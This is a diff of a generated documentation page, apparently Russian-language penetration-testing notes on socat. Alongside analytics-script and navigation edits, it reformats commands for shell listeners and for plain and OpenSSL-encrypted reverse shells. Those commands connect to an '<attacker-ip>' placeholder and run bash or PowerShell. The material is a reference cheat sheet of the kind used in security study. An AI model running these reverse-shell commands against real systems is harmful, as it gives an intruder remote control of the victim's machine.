@@ -51,6 +51,18 @@
     <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
+  
+
+
+  
+  
+
+
+  <script id="__analytics">function __md_analytics(){function n(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],n("js",new Date),n("config","G-HVGKC2VEZ3"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&n("event","search",{search_term:this.value})}),document$.subscribe(function(){var a=document.forms.feedback;if(void 0!==a)for(var e of a.querySelectorAll("[type=submit]"))e.addEventListener("click",function(e){e.preventDefault();var t=document.location.pathname,e=this.getAttribute("data-md-value");n("event","feedback",{page:t,data:e}),a.firstElementChild.disabled=!0;e=a.querySelector(".md-feedback__note [data-md-value='"+e+"']");e&&(e.hidden=!1)}),a.hidden=!1}),location$.subscribe(function(e){n("config","G-HVGKC2VEZ3",{page_path:e.pathname})})});var e=document.createElement("script");e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-HVGKC2VEZ3",document.getElementById("__analytics").insertAdjacentElement("afterEnd",e)}</script>
+
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
 
     
     
@@ -1528,8 +1540,6 @@
         
           
         
-          
-        
       
       
         
@@ -1588,20 +1598,6 @@
     <li class="md-nav__item">
       <a href="../../../Linux/Kernel/" class="md-nav__link">
         Kernel
-      </a>
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../../Linux/Linux_directories_%28Filesystem_hierarchy_standart_-_FHS%29/" class="md-nav__link">
-        Linux directories (FHS)
       </a>
     </li>
   
@@ -2227,34 +2223,44 @@
 <h1 id="socat">socat</h1>
 <hr />
 <h3 id="listeners-shell">Listeners для различных видов shell:</h3>
-<p>Базовый listener (не стабильный): <strong><code>socat TCP-L:&lt;port&gt; -</code></strong>
-Полноценный listener: <strong><code>socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0</code></strong> (only Linux)</p>
+<p>Базовый listener (не стабильный): 
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>socat<span class="w"> </span>TCP-L:&lt;port&gt;<span class="w"> </span>-
+</span></code></pre></div>
+Полноценный listener:
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Применимо только к Linux машинам</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>socat<span class="w"> </span>TCP-L:&lt;port&gt;<span class="w"> </span>FILE:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span>
+</span></code></pre></div></p>
 <h3 id="socat-payloads">Socat Payloads</h3>
-<ol>
-<li>Для базового listener:</li>
-</ol>
-<p><strong><code>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes</code></strong> (only Windows)
-<strong><code>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:"bash -li"</code></strong> (for Linux)</p>
-<ol>
-<li>Для продвинутого listener:</li>
-</ol>
-<p><strong><code>socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:"bash -li",pty,stderr,sigint,setsid,sane</code></strong></p>
+<p>Для базового listener:</p>
+<div class="language-Bash highlight"><span class="filename">Для Windows машин</span><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>socat<span class="w"> </span>TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;<span class="w"> </span>EXEC:powershell.exe,pipes
+</span></code></pre></div>
+<div class="language-Bash highlight"><span class="filename">Для Linux машин</span><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>socat<span class="w"> </span>TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;<span class="w"> </span>EXEC:<span class="s2">&quot;bash -li&quot;</span>
+</span></code></pre></div>
+<p>Для продвинутого listener:</p>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>socat<span class="w"> </span>TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt;<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>EXEC:<span class="s2">&quot;bash -li&quot;</span>,pty,stderr,sigint,setsid,sane
+</span></code></pre></div>
 <h3 id="socat-encrypted-shell">Socat encrypted Shell</h3>
 <p>В socat есть возможность создания шифрованного канала:</p>
-<ol>
-<li>Генерируются ключ (shell.key), самоподписанный сертификат (shell.crt) и сертификат на ключ (cert.pem) </li>
-</ol>
-<p><strong><code>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</code></strong>
-<strong><code>cat shell.key shell.crt &gt; shell.pem</code></strong></p>
-<ol>
-<li>Далее как полноценном listener:</li>
-</ol>
-<p><strong><code>socat OPENSSL-LISTEN:&lt;port&gt;,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0</code></strong></p>
-<ol>
-<li>Для обратного соединения:</li>
-</ol>
-<p><strong><code>socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash</code></strong></p>
+<p>Генерируются ключ <code>shell.key</code>, самоподписанный сертификат <code>shell.crt</code> и сертификат на ключ <code>cert.pem</code> </p>
+<p><div class="language-Bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>openssl<span class="w"> </span>req<span class="w"> </span>--newkey<span class="w"> </span>rsa:2048<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>-nodes<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>-keyout<span class="w"> </span>shell.key<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>-x509<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>-days<span class="w"> </span><span class="m">362</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>-out<span class="w"> </span>shell.crt
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>cat<span class="w"> </span>shell.key<span class="w"> </span>shell.crt<span class="w"> </span>&gt;<span class="w"> </span>shell.pem
+</span></code></pre></div>
+Далее как полноценном listener:</p>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>socat<span class="w"> </span>OPENSSL-LISTEN:&lt;port&gt;,cert<span class="o">=</span>shell.pem,verify<span class="o">=</span><span class="m">0</span><span class="w"> </span>FILE:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span>
+</span></code></pre></div>
+<p>Для обратного соединения:</p>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>socat<span class="w"> </span>OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify<span class="o">=</span><span class="m">0</span><span class="w"> </span>EXEC:/bin/bash
+</span></code></pre></div>
 
+
+  
 
 
 
